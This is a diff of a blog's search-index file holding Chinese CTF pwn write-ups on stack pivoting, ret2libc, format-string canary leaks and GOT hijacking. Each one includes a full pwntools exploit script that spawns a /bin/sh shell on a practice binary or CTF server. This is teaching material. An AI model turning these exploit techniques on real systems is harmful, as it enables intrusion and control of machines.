b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload2 = payload2.ljust(0x28,b&#x27;\x00&#x27;) + p32(ebp_addr-0x38) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1tCbGFjayUyMFdhdGNoJTIwJUU1JTg1JUE1JUU3JUJFJUE0JUU5JUEyJTk4XVBXTg==">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>checksec;file，32位，开启NX保护<br><img src="/images/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p>
+<p><img src="/images/p1/s9.png"></p>
+<p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img src="/images/p1/s10.png"></p>
+<p>所以我们的思路是，</p>
+<ol>
+<li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一次read的payload1和对应bss段中的结构 </span><br><span class="line">payload1 = b&#x27;aaaa&#x27;+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/p1/s11.png"></p>
+</li>
+<li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/images/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第二次read的payload2 </span><br><span class="line">payload2=cyclic(0x18)+p32(bss)+p32(leave_ret) </span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第三次read的payload3 </span><br><span class="line">payload3=&#x27;aaaa&#x27;+p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li>
+</ol>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28739)</span><br><span class="line">elf = ELF(&#x27;./spwn&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload1 = b&#x27;aaaa&#x27; + p32(write_plt) + p32(main_addr) +  p32(1) + p32(write_got) + p32(4)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload1)</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">bss = 0x0804A300</span><br><span class="line">leave_ret = 0x08048511</span><br><span class="line">payload2 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload2)</span><br><span class="line">write_addr = u32(io.recv(4))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">payload3 = b&#x27;aaaa&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload3)</span><br><span class="line"></span><br><span class="line"># 第四次read</span><br><span class="line">payload4 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>栈迁移</tag>
+        <tag>ciscn_2019_es_2</tag>
+        <tag>Black Watch 入群题-PWN1</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>栈上ORW学习总结</title>
     <url>/posts/1d47/</url>
     <content><![CDATA[<h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbox的作用。</p>
@@ -827,182 +1003,6 @@
         <tag>ORW</tag>
         <tag>极客大挑战_2019_Not_Bad</tag>
         <tag>HGAME_2023_week1_orw</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>栈迁移学习总结</title>
-    <url>/posts/6e43/</url>
-    <content><![CDATA[<h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote>
-<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9mYW5jeS1yb3AvI3N0YWNrLXBpdm90aW5n">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。</p>
-<span id="more"></span>
-
-<p><img src="/images/p1/s1.png"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/images/p1/s2.png"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)<br>通过两道例题实践栈迁移</p>
-<hr>
-<h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote>
-<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2Npc2NuXzIwMTlfZXNfMg==">https://buuoj.cn/challenges#ciscn_2019_es_2<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>checksec;file：32位，开启NX保护<br><img src="/images/p1/s3.png"></p>
-<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/images/p1/s4.png"></p>
-<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/images/p1/s5.png"></p>
-<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/images/p1/s6.png"></p>
-<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/images/p1/s7.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp_addr = ebp_addr - 0x38    #这是我们迁移的位置(迁移到栈顶)</span><br><span class="line">binsh_addr = ebp_addr - 0x28    #这是我们写入的binsh距离ebp的位置</span><br></pre></td></tr></table></figure>
-
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,26904)</span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_es_2&#x27;)</span><br><span class="line"></span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x08048562          #0x08048562 : leave ; ret</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*36 + b&#x27;bbbb&#x27;</span><br><span class="line">io.sendafter(&#x27;name?\n&#x27;,payload1)</span><br><span class="line">io.recvuntil(b&#x27;bbbb&#x27;)</span><br><span class="line">ebp_addr = u32(io.recv(4))</span><br><span class="line">success(hex(ebp_addr))</span><br><span class="line">esp_addr = ebp_addr - 0x38</span><br><span class="line">binsh_addr = ebp_addr - 0x28</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;aaaa&#x27;+ p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload2 = payload2.ljust(0x28,b&#x27;\x00&#x27;) + p32(ebp_addr-0x38) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote>
-<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1tCbGFjayUyMFdhdGNoJTIwJUU1JTg1JUE1JUU3JUJFJUE0JUU5JUEyJTk4XVBXTg==">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>checksec;file，32位，开启NX保护<br><img src="/images/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p>
-<p><img src="/images/p1/s9.png"></p>
-<p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img src="/images/p1/s10.png"></p>
-<p>所以我们的思路是，</p>
-<ol>
-<li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一次read的payload1和对应bss段中的结构 </span><br><span class="line">payload1 = b&#x27;aaaa&#x27;+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
-<p><img src="/images/p1/s11.png"></p>
-</li>
-<li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/images/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第二次read的payload2 </span><br><span class="line">payload2=cyclic(0x18)+p32(bss)+p32(leave_ret) </span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第三次read的payload3 </span><br><span class="line">payload3=&#x27;aaaa&#x27;+p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li>
-</ol>
-<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28739)</span><br><span class="line">elf = ELF(&#x27;./spwn&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload1 = b&#x27;aaaa&#x27; + p32(write_plt) + p32(main_addr) +  p32(1) + p32(write_got) + p32(4)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload1)</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">bss = 0x0804A300</span><br><span class="line">leave_ret = 0x08048511</span><br><span class="line">payload2 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload2)</span><br><span class="line">write_addr = u32(io.recv(4))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">payload3 = b&#x27;aaaa&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload3)</span><br><span class="line"></span><br><span class="line"># 第四次read</span><br><span class="line">payload4 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>pwn学习</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>栈迁移</tag>
-        <tag>ciscn_2019_es_2</tag>
-        <tag>Black Watch 入群题-PWN1</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PolarCTF2025春季个人挑战赛——部分WP</title>
-    <url>/posts/42e0/</url>
-    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~</p>
-<blockquote>
-<p>题目附件：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL3B3bi90cmVlL21haW4vcG9sYXJjdGYyMDI1X1NwcmluZw==">https://github.com/kubansec/pwn/tree/main/polarctf2025_Spring<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<span id="more"></span>
-
-<h1 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h1><p>知识点：</p>
-<ul>
-<li>ret2read</li>
-<li>ret2libc</li>
-</ul>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，64位小端，只开了NX保护：</p>
-<p><img src="/./images/p9/image.png"></p>
-<p>IDA中打开</p>
-<p><img src="/./images/p9/image-2.png"></p>
-<p>switch()只会进行一次，所以不用想肯定是利用存在栈溢出的这个wrshell()函数，注意wrshell()中read只能溢出一个字长，也就是只能覆盖rbp。</p>
-<p>看到if判断</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( v4 == 520 &amp;&amp; n == 520 )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;GOOD&quot;);</span><br><span class="line">   xxx();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>我们要进入这个xxx()函数，得满足<code>v4 == 520 &amp;&amp; n == 520</code>这个条件，v4是我们输入的，我们需要再修改n的值为520，由于只有一次scanf的机会，所以想到在scanf的时候，同时给v4和n读入520。<br>观察scanf前的处理</p>
-<p><img src="/./images/p9/image-6.png"></p>
-<p>var_4是<code>地址-4</code>，<code>call scanf</code>前将rbp-4的地址赋给rax，作为scanf拟写入的参数，而rbp是我们可以随意覆盖的。<br>由于我们想要修改的变量n的地址在<code>0x60108C</code>，所以将rbp覆盖为<code>0x60108C+4</code>。</p>
-<p><img src="/./images/p9/image-3.png"></p>
-<p>这样一来scanf读入v4的值的同时，n也会写入同样的值。<br><em>这种攻击手法称为栈迁移中return2read攻击</em></p>
-<p>接着顺利进入<code>xxx()</code>：</p>
-<p><img src="/./images/p9/image-7.png"></p>
-<p>有0x100的溢出空间，常规泄露地址打ret2libc即可。</p>
-<p>这里泄露puts和read的地址，在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到对应的libc直接打就行</p>
-<p><img src="/./images/p9/image-8.png"></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./koi&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">n_addr = 0x60108c</span><br><span class="line">xxx_addr = 0x4009CE</span><br><span class="line">rdi = 0x400a63</span><br><span class="line">ret = 0x4005d9</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(0x50) + p64(n_addr + 0x4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line"></span><br><span class="line"># 泄露puts</span><br><span class="line">io.recv() </span><br><span class="line">elf = ELF(&#x27;./koi&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 泄露read</span><br><span class="line">io.recv()</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) +p64(rdi) + p64(read_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x80e50</span><br><span class="line">system_addr = libc_base + 0x50d70</span><br><span class="line">binsh_addr = libc_base + 0x1d8678</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(binsh_addr) + p64(ret) +  p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="bllhl-mom"><a href="#bllhl-mom" class="headerlink" title="bllhl_mom"></a>bllhl_mom</h1><p>知识点：</p>
-<ul>
-<li>格式化字符串漏洞泄露canary</li>
-<li>栈迁移</li>
-</ul>
-<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先checksec看一下<br><img src="/./images/p9/image-9.png"><br>32位小端，开启了canary和NX保护.</p>
-<p>IDA中看到，漏洞函数mom()确实存在canary，并且这个canary位于<code>ebp-0xc</code>的位置</p>
-<p><img src="/./images/p9/image-11.png"></p>
-<p>mom()中有三次read，均存在漏洞:</p>
-<p><img src="/./images/p9/image-10.png"></p>
-<p>第一个read只能输5字节，存在格式化字符串漏洞，可以泄露栈上信息，那么就用他来泄露canary，调试中算一下偏移是<code>%23$p</code>;</p>
-<p><img src="/./images/p9/image-12.png"></p>
-<p>第二个和第三个read均可以溢出2个字长，因为溢出字节很少，只能栈迁移到栈上.<br>那么第二个read就是用来泄露ebp的值，第三个read用来栈迁移。</p>
-<blockquote>
-<p>跟<code>ciscn_2019_es_2</code>这道题有点像，感兴趣可以去读我的这篇文章<a href="https://kubansec.github.io/posts/6e43/?highlight=%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移学习总结</a></p>
-</blockquote>
-<p>因为程序中有system，但没有<code>/bin/sh</code>，所以需要在栈中部署<code>/bin/sh</code>，最终布置的栈结构和栈帧的变化如图所示：</p>
-<p><img src="/./images/p9/image-13.png"></p>
-<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./bllhl_mom&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bllhl_mom&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">io.recv()</span><br><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">canary = int(io.recv(10),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">io.send(cyclic(0x50))</span><br><span class="line">io.recvuntil(b&#x27;taaa&#x27;)</span><br><span class="line">ebp = u32(io.recv(4))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">leave_ret = 0x0804861f</span><br><span class="line">system_addr = 0x08048490</span><br><span class="line">binsh_addr = ebp - 0x50</span><br><span class="line">canary_addr = ebp - 0xc</span><br><span class="line">payload = b&#x27;AAAA&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x44,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload = payload.ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(ebp-0x60) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><p>知识点：</p>
-<ul>
-<li>ret2libc</li>
-</ul>
-<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，32位程序，只开了NX保护<br><img src="/./images/p9/image-14.png"></p>
-<p>IDA 里面看到是一个非常简单的栈溢出<br><img src="/./images/p9/image-15.png"></p>
-<p>那么直接泄露地址，打ret2libc就可以了。可以多泄露几个函数，交叉查询就不用一个一个去尝试了</p>
-<p>在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到libc<br><img src="/./images/p9/image-18.png"></p>
-<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./libc&#x27;)</span><br><span class="line">elf = ELF(&#x27;libc&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu_addr = 0x08048561</span><br><span class="line"></span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(puts_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">puts_addr = u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x0732a0</span><br><span class="line">sys_addr = libc_base +  0x048170</span><br><span class="line">binsh_addr = libc_base + 0x1bd0d5</span><br><span class="line">payload = cyclic(58+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h1><p>知识点：</p>
-<ul>
-<li>格式化字符串漏洞</li>
-<li>劫持got表</li>
-</ul>
-<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，32位，开启canary和NX保护，<code>RELRO:      Partial RELRO</code>代表got表可写<br><img src="/./images/p9/image-20.png"></p>
-<p>IDA里面分析：</p>
-<p><img src="/./images/p9/image-21.png"></p>
-<p>yichu函数存在两次格式化字符串漏洞</p>
-<p>测一下偏移，偏移为6：</p>
-<p><img src="/./images/p9/image-23.png"></p>
-<p>并且存在system函数:<br><img src="/./images/p9/image-22.png"></p>
-<p>那么思路就是利用第一次格式化字符串漏洞将printf的got表指针指向system函数，第二次发送<code>/bin/sh</code>构造<code>printf(&#39;/bin/sh&#39;)</code>，程序就会执行<code>system(&#39;/bin/sh&#39;)</code>了</p>
